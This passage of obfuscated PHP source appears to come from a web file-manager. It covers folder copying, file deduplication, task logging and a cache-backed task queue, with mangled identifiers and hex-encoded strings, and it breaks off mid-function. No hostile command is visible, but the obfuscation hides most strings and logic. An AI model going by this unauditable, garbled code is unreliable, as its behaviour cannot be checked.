$‚ğ¦°Â±[91] && $‘‡ÏÀÄ©[$‚ğ¦°Â±[527]] != $‚ğ¦°Â±[91]; if ($††Úõ¬ö) { $äÊÊğ¤„[$‚ğ¦°Â±[526]] = 0; } if ($“Áñ™Ù•) { $‹€’½´Ğ = array($‚ğ¦°Â±[681] => array($‚ğ¦°Â±[642], $©ÖÛÏñÜ[$‚ğ¦°Â±[611]] . $©ÖÛÏñÜ[$‚ğ¦°Â±[192]] . $‚ğ¦°Â±[643])); $¼ú¹ğÔ = $©ÖÛÏñÜ[$‚ğ¦°Â±[611]] . $©ÖÛÏñÜ[$‚ğ¦°Â±[192]] . $‚ğ¦°Â±[50]; $·ÊÉîçŞ = $‘‡ÏÀÄ©[$‚ğ¦°Â±[611]] . $‘‡ÏÀÄ©[$‚ğ¦°Â±[192]] . $‚ğ¦°Â±[50] . $©ÖÛÏñÜ[$‚ğ¦°Â±[192]] . $‚ğ¦°Â±[50]; $ï™Úé = array($‚ğ¦°Â±[681] => array($‚ğ¦°Â±[690], "\162\x65\160\x6c\x61\x63\x65\x28\x70\141\162\x65\x6e\164\x4c\145\166\145\x6c\54\x27{$¼ú¹ğÔ}\47\x2c\x27{$·ÊÉîçŞ}\47\x29"), $‚ğ¦°Â±[677] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[189]], $‚ğ¦°Â±[678] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[596]]); if ($††Úõ¬ö) { $ï™Úé[$‚ğ¦°Â±[526]] = 0; } $this->where($‹€’½´Ğ)->data($ï™Úé)->save(); } $this->where(array($‚ğ¦°Â±[513] => $—ÎèÏË))->data($äÊÊğ¤„)->save(); return $—ÎèÏË; } private function clearShare($¦ıİõ Õ, $Ò­¿¹º…) { $¾ıÌ˜„¢ =& $_SERVER[€ä¾™²]; $ÁŠµ™Ç· = $this->sourceInfo($¦ıİõ Õ); $ ŞĞÃ¡İ = $this->sourceInfo($Ò­¿¹º…); if ($ÁŠµ™Ç·[$¾ıÌ˜„¢[596]] == $ ŞĞÃ¡İ[$¾ıÌ˜„¢[596]] && $ÁŠµ™Ç·[$¾ıÌ˜„¢[189]] == $¾ıÌ˜„¢[691]) { return; } $¹È­©Ÿ‡ = array($¾ıÌ˜„¢[611] => array($¾ıÌ˜„¢[642], $ÁŠµ™Ç·[$¾ıÌ˜„¢[611]] . $¦ıİõ Õ . $¾ıÌ˜„¢[643])); $šæµœ³š = $this->field($¾ıÌ˜„¢[513])->where($¹È­©Ÿ‡)->getField($¾ıÌ˜„¢[192], !0); if (!$šæµœ³š) { return; } $¹È­©Ÿ‡ = array($¾ıÌ˜„¢[192] => array($¾ıÌ˜„¢[7], $šæµœ³š), $¾ıÌ˜„¢[692] => 1); $æü½©û˜ = Model($¾ıÌ˜„¢[693])->field($¾ıÌ˜„¢[694])->where($¹È­©Ÿ‡)->select(); if (!$æü½©û˜) { return; } $æü½©û˜ = array_to_keyvalue($æü½©û˜, $¾ıÌ˜„¢[12], $¾ıÌ˜„¢[694]); $¹È­©Ÿ‡ = array($¾ıÌ˜„¢[694] => array($¾ıÌ˜„¢[7], $æü½©û˜)); Model($¾ıÌ˜„¢[693])->where($¹È­©Ÿ‡)->save(array($¾ıÌ˜„¢[692] => 0)); Model($¾ıÌ˜„¢[695])->where($¹È­©Ÿ‡)->delete(); } public function copyFolderFromIO($ğ÷ËØæş, $°‹…¤˜¯, $ÒÄ­„, $Ì¸À¦÷¼, $ş˜æÆí, $¨†ƒÑ‰¢ = false) { $‰ÏŒüË =& $_SERVER[€ä¾™²]; $±ÒñË¨ = array($‰ÏŒüË[660] => array(), $‰ÏŒüË[661] => array(), $‰ÏŒüË[659] => array(), $‰ÏŒüË[696] => array()); $…Èøò­ı = $¨†ƒÑ‰¢ ? $¨†ƒÑ‰¢ : $ğ÷ËØæş->pathThis($°‹…¤˜¯); $òë±ÀÕ˜ = $this->fileNameExist($ÒÄ­„, $…Èøò­ı); $†°ã´› = $this->mkdir($ÒÄ­„, $…Èøò­ı, $Ì¸À¦÷¼); if (!$òë±ÀÕ˜ || $Ì¸À¦÷¼ == REPEAT_RENAME_FOLDER) { $Ì¸À¦÷¼ = !1; } if ($òë±ÀÕ˜) { $this->_childrenAllMake($òë±ÀÕ˜); } Hook::trigger($‰ÏŒüË[697]); $¨¨Ø¯£• = KodIO::ioFileDriverGet($‰ÏŒüË[505] . $ÒÄ­„ . $‰ÏŒüË[403]); $this->_copyChildTo($ğ÷ËØæş, $°‹…¤˜¯, $†°ã´›, $Ì¸À¦÷¼, $±ÒñË¨, $ş˜æÆí, $¨¨Ø¯£•); Hook::trigger($‰ÏŒüË[698]); if ($†°ã´›) { $this->folderSizeResetChildren($†°ã´›); } $this->_childrenListClear(); Model($‰ÏŒüË[471])->addAll($±ÒñË¨[$‰ÏŒüË[660]], array(), !0); Model($‰ÏŒüË[662])->eventCopy($†°ã´›); $this->saveAll($±ÒñË¨[$‰ÏŒüË[661]]); Model($‰ÏŒüË[567])->linkAdd($±ÒñË¨[$‰ÏŒüË[659]]); Model($‰ÏŒüË[567])->remove($±ÒñË¨[$‰ÏŒüË[696]]); $this->folderSizeReset($ÒÄ­„); $this->updateModifyTime($ÒÄ­„); return $†°ã´›; } private function _copyChildTo($ØÅĞ¯™ó, $–¦–“Öğ, $·¶“®Ş, $ò…›–†, &$´íñÚ³ó, $ø¬«Íˆ´, $şú´†Áî) { $»‚¯û«Û =& $_SERVER[€ä¾™²]; $Ÿ‹Ì¥Öï = $this->sourceInfoCache($·¶“®Ş); $³£åÚÑù = $ØÅĞ¯™ó->listPath($–¦–“Öğ); $³£åÚÑù = $³£åÚÑù ? $³£åÚÑù : array($»‚¯û«Û[86] => array(), $»‚¯û«Û[85] => array()); $Õ°Ñ·¨¼ = array_merge($³£åÚÑù[$»‚¯û«Û[86]], $³£åÚÑù[$»‚¯û«Û[85]]); $“Œ˜§ºÅ = $this->_addFiles($ØÅĞ¯™ó, $şú´†Áî, $³£åÚÑù[$»‚¯û«Û[86]], $ø¬«Íˆ´); $ Ï¶Ò´ = array(); foreach ($Õ°Ñ·¨¼ as &$ìÄÂ‡ü„) { if (isset($“Œ˜§ºÅ[$ìÄÂ‡ü„[$»‚¯û«Û[32]]])) { $ìÄÂ‡ü„ = $“Œ˜§ºÅ[$ìÄÂ‡ü„[$»‚¯û«Û[32]]]; } $ìÄÂ‡ü„[$»‚¯û«Û[507]] = $ìÄÂ‡ü„[$»‚¯û«Û[33]] == $»‚¯û«Û[78]; $ìÄÂ‡ü„[$»‚¯û«Û[508]] = substr(_get($ìÄÂ‡ü„, $»‚¯û«Û[167], $»‚¯û«Û[12]), 0, 10); $ìÄÂ‡ü„[$»‚¯û«Û[79]] = _get($ìÄÂ‡ü„, $»‚¯û«Û[79], 0); $ìÄÂ‡ü„[$»‚¯û«Û[564]] = _get($ìÄÂ‡ü„, $»‚¯û«Û[564], 0); if (!isset($ìÄÂ‡ü„[$»‚¯û«Û[699]]) && $ìÄÂ‡ü„[$»‚¯û«Û[564]]) { $´íñÚ³ó[$»‚¯û«Û[696]][] = $ìÄÂ‡ü„[$»‚¯û«Û[564]]; } if ($ò…›–†) { $£ˆáÕ˜ğ = $this->fileNameExistCache($·¶“®Ş, $ìÄÂ‡ü„[$»‚¯û«Û[32]]); if ($£ˆáÕ˜ğ) { if ($ìÄÂ‡ü„[$»‚¯û«Û[507]] || $ò…›–† == REPEAT_SKIP) { continue; } if ($ò…›–† == REPEAT_REPLACE) { $ŸëÌƒ°³ = $this->sourceInfoCache($£ˆáÕ˜ğ); $óÕ†ò¤“ = $this->fileHistory($ŸëÌƒ°³, $ìÄÂ‡ü„[$»‚¯û«Û[564]], $ìÄÂ‡ü„[$»‚¯û«Û[79]]); if ($óÕ†ò¤“) { $´íñÚ³ó[$»‚¯û«Û[659]][] = $ìÄÂ‡ü„[$»‚¯û«Û[564]]; } continue; } else { if ($ò…›–† == REPEAT_RENAME) { $ìÄÂ‡ü„[$»‚¯û«Û[32]] = $this->fileNameAutoCache($·¶“®Ş, $ìÄÂ‡ü„[$»‚¯û«Û[32]], $ò…›–†, !1); } } } } if (!$ìÄÂ‡ü„[$»‚¯û«Û[507]] && $ìÄÂ‡ü„[$»‚¯û«Û[564]] == 0) { continue; } if (!$ìÄÂ‡ü„[$»‚¯û«Û[507]] && $ìÄÂ‡ü„[$»‚¯û«Û[564]]) { $´íñÚ³ó[$»‚¯û«Û[659]][] = $ìÄÂ‡ü„[$»‚¯û«Û[564]]; } $ Ï¶Ò´[] = $this->_makeItemData($ìÄÂ‡ü„, $Ÿ‹Ì¥Öï, $ìÄÂ‡ü„[$»‚¯û«Û[32]]); } unset($ìÄÂ‡ü„); if (!empty($ Ï¶Ò´)) { $this->addAll($ Ï¶Ò´); $this->_childrenListSelect($·¶“®Ş); } $Õñ‚÷«É = $this->_childrenList($·¶“®Ş); $Õñ‚÷«É = array_to_keyvalue($Õñ‚÷«É, $»‚¯û«Û[32]); foreach ($Õ°Ñ·¨¼ as $ìÄÂ‡ü„) { $ŸëÌƒ°³ = $Õñ‚÷«É[$ìÄÂ‡ü„[$»‚¯û«Û[32]]]; $—“„¥Àæ = $ŸëÌƒ°³[$»‚¯û«Û[192]]; $this->_copyApplyMeta($ŸëÌƒ°³, $´íñÚ³ó); if ($ìÄÂ‡ü„[$»‚¯û«Û[33]] == $»‚¯û«Û[78]) { $ìÄÂ‡ü„[$»‚¯û«Û[87]] = $ØÅĞ¯™ó->getPathInner($ìÄÂ‡ü„[$»‚¯û«Û[87]]); $this->_copyChildTo($ØÅĞ¯™ó, $ìÄÂ‡ü„[$»‚¯û«Û[87]], $—“„¥Àæ, $ò…›–†, $´íñÚ³ó, $ø¬«Íˆ´, $şú´†Áî); } } } private function _addFiles($Ó±Ë³ÈÔ, $³˜Ÿíš, $ˆÏı­§·, $¬ã’áÎÔ) { $³ŞÖĞİ¹ =& $_SERVER[€ä¾™²]; if (!$ˆÏı­§· || count($ˆÏı­§·) == 0) { return array(); } $­¹ªñÖº = array(); foreach ($ˆÏı­§· as &$Ñ‘û¹çş) { Hook::trigger($³ŞÖĞİ¹[700], $Ñ‘û¹çş); $Ñ‘û¹çş[$³ŞÖĞİ¹[87]] = $Ó±Ë³ÈÔ->getPathInner($Ñ‘û¹çş[$³ŞÖĞİ¹[87]]); $‘ş¢ğ›î = $Ó±Ë³ÈÔ->hashSimple($Ñ‘û¹çş[$³ŞÖĞİ¹[87]]); $‰‚‚ö§Â = $Ó±Ë³ÈÔ->hashMd5($Ñ‘û¹çş[$³ŞÖĞİ¹[87]]); if (strlen($‰‚‚ö§Â) > 10 && !isset($­¹ªñÖº[$‰‚‚ö§Â])) { $­¹ªñÖº[$‰‚‚ö§Â] = array(); } $Ñ‘û¹çş[$³ŞÖĞİ¹[701]] = $‘ş¢ğ›î; $Ñ‘û¹çş[$³ŞÖĞİ¹[570]] = $‰‚‚ö§Â; $­¹ªñÖº[$‰‚‚ö§Â][] =& $Ñ‘û¹çş; if (count($­¹ªñÖº[$‰‚‚ö§Â]) > 1) { $Ñ‘û¹çş[$³ŞÖĞİ¹[699]] = !0; } Hook::trigger($³ŞÖĞİ¹[702], $Ñ‘û¹çş); } unset($Ñ‘û¹çş); $±¨öèå» = array($³ŞÖĞİ¹[570] => array($³ŞÖĞİ¹[7], array_keys($­¹ªñÖº))); $§™Îúä… = Model($³ŞÖĞİ¹[703]); $±Ú¤ş…Å = $§™Îúä…->where($±¨öèå»)->select(); $±Ú¤ş…Å = $±Ú¤ş…Å ? $±Ú¤ş…Å : array(); foreach ($±Ú¤ş…Å as $Î¿¯²îÎ) { if (!isset($­¹ªñÖº[$Î¿¯²îÎ[$³ŞÖĞİ¹[570]]])) { continue; } $¢”Ë§³ª = $­¹ªñÖº[$Î¿¯²îÎ[$³ŞÖĞİ¹[570]]]; foreach ($¢”Ë§³ª as &$Ñ‘û¹çş) { $Ñ‘û¹çş[$³ŞÖĞİ¹[564]] = $Î¿¯²îÎ[$³ŞÖĞİ¹[564]]; $Ñ‘û¹çş[$³ŞÖĞİ¹[699]] = !0; } unset($Ñ‘û¹çş); } $Û¬¶–Ô = array(); foreach ($ˆÏı­§· as $¦‘Äúóª) { Hook::trigger($³ŞÖĞİ¹[704], $¦‘Äúóª); if (isset($¦‘Äúóª[$³ŞÖĞİ¹[699]]) && $¦‘Äúóª[$³ŞÖĞİ¹[699]]) { Hook::trigger($³ŞÖĞİ¹[705], $¦‘Äúóª); continue; } $°¸µ­“† = $Ó±Ë³ÈÔ->getPathInner($¦‘Äúóª[$³ŞÖĞİ¹[87]]); $âı£ˆÆ = $§™Îúä…->addFileMake($°¸µ­“†, $³˜Ÿíš, $¦‘Äúóª[$³ŞÖĞİ¹[79]], $¦‘Äúóª[$³ŞÖĞİ¹[701]], $¦‘Äúóª[$³ŞÖĞİ¹[570]], $¦‘Äúóª[$³ŞÖĞİ¹[32]], $¬ã’áÎÔ); Hook::trigger($³ŞÖĞİ¹[705], $¦‘Äúóª); if (!is_array($âı£ˆÆ)) { continue; } $Û¬¶–Ô[] = $âı£ˆÆ; } $§™Îúä…->addAll($Û¬¶–Ô); $±¨öèå» = array($³ŞÖĞİ¹[570] => array($³ŞÖĞİ¹[7], array_keys($­¹ªñÖº))); $±Ú¤ş…Å = $§™Îúä…->where($±¨öèå»)->select(); $±Ú¤ş…Å = $±Ú¤ş…Å ? $±Ú¤ş…Å : array(); foreach ($±Ú¤ş…Å as $Î¿¯²îÎ) { if (!isset($­¹ªñÖº[$Î¿¯²îÎ[$³ŞÖĞİ¹[570]]])) { continue; } $èò¾Ğ²Ş =& $­¹ªñÖº[$Î¿¯²îÎ[$³ŞÖĞİ¹[570]]]; foreach ($èò¾Ğ²Ş as &$Ñ‘û¹çş) { $Ñ‘û¹çş[$³ŞÖĞİ¹[564]] = $Î¿¯²îÎ[$³ŞÖĞİ¹[564]]; } unset($Ñ‘û¹çş); } $¥şŒñ×º = array(); foreach ($ˆÏı­§· as $±•€¬¤´) { $¥şŒñ×º[$±•€¬¤´[$³ŞÖĞİ¹[32]]] = $±•€¬¤´; } return $¥şŒñ×º; } } define($_SERVER[€ä¾™²][706], $_SERVER[€ä¾™²][707]); goto Aöï…ŸåÍ; a×ÇéÑª™„: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¨¿¯…¨—, $„ó®Çóö = '', $Ÿï™‹‘ë = 0, $ëŠÆÙ´ = '') { $´Š“ì˜¦ =& $_SERVER[€ä¾™²]; $ëŠÆÙ´ = $ëŠÆÙ´ ? $ëŠÆÙ´ : ($„ó®Çóö ? $„ó®Çóö : $¨¿¯…¨—); $Àóğşèõ = new Task($¨¿¯…¨—, $„ó®Çóö, $Ÿï™‹‘ë, $ëŠÆÙ´); $GLOBALS[$´Š“ì˜¦[2014] . $¨¿¯…¨—] = new TaskLog($´Š“ì˜¦[1906], $Àóğşèõ, $ëŠÆÙ´); return $Àóğşèõ; } public function __construct($Í¤Ã¹‰ì = '', $§è¹Â—Â = '', $ÌÏ¢˜©® = '') { $®Ô­‹ =& $_SERVER[€ä¾™²]; if (!$Í¤Ã¹‰ì) { $Í¤Ã¹‰ì = $®Ô­‹[1906]; } $—ô»‹á = $Í¤Ã¹‰ì . $®Ô­‹[476] . rand_string(10); if (!$ÌÏ¢˜©®) { $ÌÏ¢˜©® = $Í¤Ã¹‰ì . $®Ô­‹[53] . $ÌÏ¢˜©®; } switch ($Í¤Ã¹‰ì) { case $®Ô­‹[1906]: if (!$§è¹Â—Â || !$§è¹Â—Â->task) { return echoLog($Í¤Ã¹‰ì . $®Ô­‹[2015]); } $µëĞÊë­ = $§è¹Â—Â; $—ô»‹á = $µëĞÊë­->task[$®Ô­‹[486]]; $Í¤Ã¹‰ì = $µëĞÊë­->task[$®Ô­‹[486]]; if (!$µëĞÊë­->task[$®Ô­‹[1810]]) { $µëĞÊë­->task[$®Ô­‹[1810]] = $ÌÏ¢˜©® ? $ÌÏ¢˜©® : $Í¤Ã¹‰ì; } break; case $®Ô­‹[2016]: if (!$§è¹Â—Â) { return echoLog($Í¤Ã¹‰ì . $®Ô­‹[2017]); } $ñ¢ŸÎ–é = is_string($§è¹Â—Â) ? array($§è¹Â—Â) : $§è¹Â—Â; $µëĞÊë­ = new TaskFileTransfer($—ô»‹á, $Í¤Ã¹‰ì, 0, $ÌÏ¢˜©® ? $ÌÏ¢˜©® : $ñ¢ŸÎ–é[0]); foreach ($ñ¢ŸÎ–é as $Øó‚¿ÏŞ) { $µëĞÊë­->addPath($Øó‚¿ÏŞ); } break; case $®Ô­‹[389]: if (!$§è¹Â—Â) { return echoLog($Í¤Ã¹‰ì . $®Ô­‹[2017]); } $ñ¢ŸÎ–é = is_string($§è¹Â—Â) ? array($§è¹Â—Â) : $§è¹Â—Â; $µëĞÊë­ = new TaskZip($—ô»‹á, $Í¤Ã¹‰ì, 0, $ÌÏ¢˜©® ? $ÌÏ¢˜©® : $ñ¢ŸÎ–é[0]); foreach ($ñ¢ŸÎ–é as $Øó‚¿ÏŞ) { $µëĞÊë­->addPath($Øó‚¿ÏŞ); } break; case $®Ô­‹[1348]: if (!$§è¹Â—Â) { return echoLog($Í¤Ã¹‰ì . $®Ô­‹[2017]); } $µëĞÊë­ = new TaskUnZip($—ô»‹á, $Í¤Ã¹‰ì, 0, $ÌÏ¢˜©® ? $ÌÏ¢˜©® : $§è¹Â—Â); if ($§è¹Â—Â) { $µëĞÊë­->addFile($§è¹Â—Â); } break; case $®Ô­‹[150]: $µëĞÊë­ = new TaskHttp($—ô»‹á, $Í¤Ã¹‰ì); break; default: return; break; } $this->task = $µëĞÊë­; $this->taskID = $—ô»‹á; Hook::bind($®Ô­‹[1942], array($this, $®Ô­‹[2018])); Hook::bind($®Ô­‹[1944], array($this, $®Ô­‹[2019])); Hook::bind($®Ô­‹[1938], array($this, $®Ô­‹[2020])); echoLog($®Ô­‹[2021] . $µëĞÊë­->task[$®Ô­‹[1810]]); } public function __destruct() { $this->end(); } public function end($ìèì×›ã = '') { $ı¹ë†İ =& $_SERVER[€ä¾™²]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ìèì×›ã); $this->task = !1; $this->taskID = !1; Hook::unbind($ı¹ë†İ[1942], array($this, $ı¹ë†İ[2018])); Hook::unbind($ı¹ë†İ[1944], array($this, $ı¹ë†İ[2019])); Hook::unbind($ı¹ë†İ[1938], array($this, $ı¹ë†İ[2020])); } public function taskUpdate($—ƒî¸³’) { $«ãü©²Æ =& $_SERVER[€ä¾™²]; if (!$—ƒî¸³’ || $this->taskID != $—ƒî¸³’[$«ãü©²Æ[486]]) { return; } $”…´˜øÎ = 20; $€ƒµˆ‘ = intval($—ƒî¸³’[$«ãü©²Æ[1923]] * $”…´˜øÎ); $Å‹¦‚Öå = $«ãü©²Æ[174] . str_repeat($«ãü©²Æ[464], $€ƒµˆ‘) . $«ãü©²Æ[1127] . str_repeat($«ãü©²Æ[53], $”…´˜øÎ - $€ƒµˆ‘) . $«ãü©²Æ[176]; $àò¼½ÙØ = $Å‹¦‚Öå . sprintf($«ãü©²Æ[2022], $—ƒî¸³’[$«ãü©²Æ[1923]] * 100) . $«ãü©²Æ[2023]; $ó”Í·¹ş = $àò¼½ÙØ . $—ƒî¸³’[$«ãü©²Æ[1922]] . $«ãü©²Æ[8] . $—ƒî¸³’[$«ãü©²Æ[1175]] . LNG($«ãü©²Æ[2024]); $°÷·“„ = $«ãü©²Æ[12]; if ($—ƒî¸³’[$«ãü©²Æ[2008]]) { $ó”Í·¹ş = $àò¼½ÙØ . size_format($—ƒî¸³’[$«ãü©²Æ[1922]]) . $«ãü©²Æ[8] . size_format($—ƒî¸³’[$«ãü©²Æ[1175]]); $°÷·“„ = size_format($—ƒî¸³’[$«ãü©²Æ[1924]]) . $«ãü©²Æ[2025]; } if ($—ƒî¸³’[$«ãü©²Æ[1177]]) { $—ƒî¸³’[$«ãü©²Æ[1973]] = $—ƒî¸³’[$«ãü©²Æ[1177]] . $«ãü©²Æ[53] . $—ƒî¸³’[$«ãü©²Æ[1973]]; } if ($—ƒî¸³’[$«ãü©²Æ[1973]]) { $éÜøêÀÍ = $«ãü©²Æ[12]; if ($—ƒî¸³’[$«ãü©²Æ[1975]]) { $éÜøêÀÍ = $«ãü©²Æ[50] . size_format($—ƒî¸³’[$«ãü©²Æ[1976]]) . $«ãü©²Æ[8] . size_format($—ƒî¸³’[$«ãü©²Æ[1975]]); } $°÷·“„ .= $—ƒî¸³’[$«ãü©²Æ[1973]] . $éÜøêÀÍ; } if ($—ƒî¸³’[$«ãü©²Æ[864]] && !$—ƒî¸³’[$«ãü©²Æ[1975]]) { $°÷·“„ .= $«ãü©²Æ[53] . size_format($—ƒî¸³’[$«ãü©²Æ[1980]]) . $«ãü©²Æ[8] . size_format($—ƒî¸³’[$«ãü©²Æ[864]]); } echoLog($ó”Í·¹ş . $«ãü©²Æ[53] . $°÷·“„, !0); } public function taskEnd($š¦ëıì‰) { $¨øÀ‹ë­ =& $_SERVER[€ä¾™²]; if (!$š¦ëıì‰ || $this->taskID != $š¦ëıì‰[$¨øÀ‹ë­[486]]) { return; } $Ïƒ¸›ú = $š¦ëıì‰ ? LNG($¨øÀ‹ë­[2026]) . $¨øÀ‹ë­[4] . $š¦ëıì‰[$¨øÀ‹ë­[1922]] . $¨øÀ‹ë­[8] . $š¦ëıì‰[$¨øÀ‹ë­[1175]] . LNG($¨øÀ‹ë­[2024]) . $¨øÀ‹ë­[74] : $¨øÀ‹ë­[12]; echoLog($¨øÀ‹ë­[2027] . $š¦ëıì‰[$¨øÀ‹ë­[1810]] . ($š¦ëıì‰[$¨øÀ‹ë­[547]] ? $¨øÀ‹ë­[74] . $š¦ëıì‰[$¨øÀ‹ë­[547]] : $¨øÀ‹ë­[12]) . $¨øÀ‹ë­[74] . $Ïƒ¸›ú . $¨øÀ‹ë­[2028] . sprintf($¨øÀ‹ë­[962], timeFloat() - $š¦ëıì‰[$¨øÀ‹ë­[1925]]) . $¨øÀ‹ë­[1937]); $this->end(); } public function taskKill($ŒÛŒ”–á) { $ÓŠ…õ =& $_SERVER[€ä¾™²]; if (!$ŒÛŒ”–á || $this->taskID != $ŒÛŒ”–á[$ÓŠ…õ[486]]) { return; } echoLog($ÓŠ…õ[2029] . $ŒÛŒ”–á[$ÓŠ…õ[1810]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\x6b\x51\165\145\x75\145\114\145\156\147\164\150"; const QUEUE_DATA = "\x74\141\x73\153\x51\165\x65\165\x65\104\x61\164\x61"; const QUEUE_TIME = "\164\141\x73\x6b\x51\165\x65\x75\x65\x4c\x61\x73\x74\122\x75\156"; const QUEUE_THREAD = "\164\x61\163\x6b\x51\x75\x65\x75\x65\124\x68\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÏúÄÕı±, $ô¿ÊŒÖÜ = array(), $’Øˆ½Ü¼ = '', $¢à†ß¨ñ = '') { $¢š Ò·„ =& $_SERVER[€ä¾™²]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¢à†ß¨ñ && array_find_by_field(self::$listData, $¢š Ò·„[95], $¢à†ß¨ñ)) { return !0; } if ($¢à†ß¨ñ && array_find_by_field(self::$listDataAdd, $¢š Ò·„[95], $¢à†ß¨ñ)) { return !0; } self::$listDataAdd[] = array($¢š Ò·„[343] => $ÏúÄÕı±, $¢š Ò·„[2030] => $ô¿ÊŒÖÜ, $¢š Ò·„[547] => $’Øˆ½Ü¼, $¢š Ò·„[95] => $¢à†ß¨ñ); return !0; } public static function addSubmit() { $¶Á°Éşà =& $_SERVER[€ä¾™²]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¶Á°Éşà[2031] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¶Á°Éşà[12], $¶Á°Éşà[547])), $¶Á°Éşà[196]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Æç‚€…î, $Ïè×„Ø‰ = array(), $Æ¸ÄÇ¼Û = '', $àÇá¸’ = '') { $ùÍËïªÒ =& $_SERVER[€ä¾™²]; if (self::count() >= self::MAX_LENGTH) { return !1; } $£¡í²’ = self::getAll(); if ($àÇá¸’ && array_find_by_field($£¡í²’, $ùÍËïªÒ[95], $àÇá¸’)) { return !0; } $£¡í²’[] = array($ùÍËïªÒ[343] => $Æç‚€…î, $ùÍËïªÒ[2030] => $Ïè×„Ø‰, $ùÍËïªÒ[547] => $Æ¸ÄÇ¼Û, $ùÍËïªÒ[95] => $àÇá¸’); self::setAll($£¡í²’); write_log($ùÍËïªÒ[2031] . $Æ¸ÄÇ¼Û, $ùÍËïªÒ[196]); return !0; } public static function run() { $¬ôîå‘® =& $_SERVER[€ä¾™²]; $Á€ÔÚ¹ = self::getAll(); $‰Ô±âÌÂ = array_shift($Á€ÔÚ¹); if (!$‰Ô±âÌÂ) { return !1; } self::setAll($Á€ÔÚ¹); $ÀçÜÚÔ = timeFloat(); $˜ö”Î½’ = $¬ôîå‘®[12]; try { $˜ö”Î½’ = Hook::apply($‰Ô±âÌÂ[$¬ôîå‘®[343]], $‰Ô±âÌÂ[$¬ôîå‘®[2030]]); } catch (Exception $í È±™®) { write_log($í È±™®, $¬ôîå‘®[1314]); } $¡Í•ìÉê = number_format(timeFloat() - $ÀçÜÚÔ, 3) . $¬ôîå‘®[1937]; if ($˜ö”Î½’ && is_string($˜ö”Î½’)) { $¡Í•ìÉê = $¡Í•ìÉê . $¬ôîå‘®[2032] . $˜ö”Î½’; } write_log($¬ôîå‘®[2033] . $‰Ô±âÌÂ[$¬ôîå‘®[547]] . $¬ôîå‘®[2034] . $¡Í•ìÉê, $¬ôîå‘®[196]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ø“·¿Ñ =& $_SERVER[€ä¾™²]; $±ã‹Ú = self::threadCount() + 1; if ($±ã‹Ú > 3 || !self::count()) { return; } write_log($Ø“·¿Ñ[2035] . $±ã‹Ú, $Ø“·¿Ñ[196]); Cache::set(self::QUEUE_THREAD, $±ã‹Ú, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ø“·¿Ñ[2036], $Ø“·¿Ñ[196]); } public static function getKey($¼±ŠŠŞ½, $´Ôèïµ² = "\151\x6e\164") { $€ß÷¾é¾ =& $_SERVER[€ä¾™²]; Cache::removeMemory($¼±ŠŠŞ½); $À—ÈŒ³ = Cache::get($¼±ŠŠŞ½); if ($´Ôèïµ² == $€ß÷¾é¾[365]) { return $À—ÈŒ³ ? intval($À—ÈŒ³) : 0; } if ($´Ôèïµ² == $€ß÷¾é¾[2037]) { return is_array($À—ÈŒ³) ? $À—ÈŒ³ : array(); } return $À—ÈŒ³; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[€ä¾™²][2037]); } public static function setAll($ö•Ÿæ‹) { $¢ÂÄ„›Á = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ö•Ÿæ‹), $¢ÂÄ„›Á); Cache::set(self::QUEUE_DATA, $ö•Ÿæ‹, $¢ÂÄ„›Á); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($îå©´£°, $ë¤­ûï = 5.0) { if (!$îå©´£°) { return; } $‰ÅøÍîÒ = Cache::get($îå©´£°); if (!$‰ÅøÍîÒ || timeFloat() - floatVal($‰ÅøÍîÒ) >= $ë¤­ûï) { Cache::set($îå©´£°, timeFloat(), $ë¤­ûï * 10); return !0; } return !1; } public static function timeLimitCall($ùÔĞ›œ¼, $éŒÜ¯, $‡…ÖÊà°, $ğ›±®òæ = 5.0) { $˜÷Šä¿² =& $_SERVER[€ä¾™²]; if (!$ùÔĞ›œ¼ || !$éŒÜ¯) { return; } self::$asyncAdd = !0; $Ë©Ú­¨ş = $˜÷Šä¿²[2038]; $—­ÚÊÛ† = Cache::get($Ë©Ú­¨ş, !0); $¦¤ã·“‰ = array($˜÷Šä¿²[2039] => timeFloat(), $˜÷Šä¿²[2040] => timeFloat(), $˜÷Šä¿²[343] => $éŒÜ¯, $˜÷Šä¿²[2030] => $‡…ÖÊà°, $˜÷Šä¿²[2041] => $ğ›±®òæ); if (is_array($—­ÚÊÛ†[$ùÔĞ›œ¼])) { if (timeFloat() - $—­ÚÊÛ†[$ùÔĞ›œ¼][$˜÷Šä¿²[2039]] <= $¦¤ã·“‰[$˜÷Šä¿²[2041]] * 0.5) { return; } $¦¤ã·“‰[$˜÷Šä¿²[2040]] = $—­ÚÊÛ†[$ùÔĞ›œ¼][$˜÷Šä¿²[2040]]; } $—­ÚÊÛ†[$ùÔĞ›œ¼] = $¦¤ã·“‰; Cache::set($Ë©Ú­¨ş, $—­ÚÊÛ†, 60); Cache::removeMemory($Ë©Ú­¨ş); write_log($˜÷Šä¿²[2042] . $ùÔĞ›œ¼ . $˜÷Šä¿²[74] . $éŒÜ¯ . $˜÷Šä¿²[2043] . ACTION, $˜÷Šä¿²[196]); } public static function 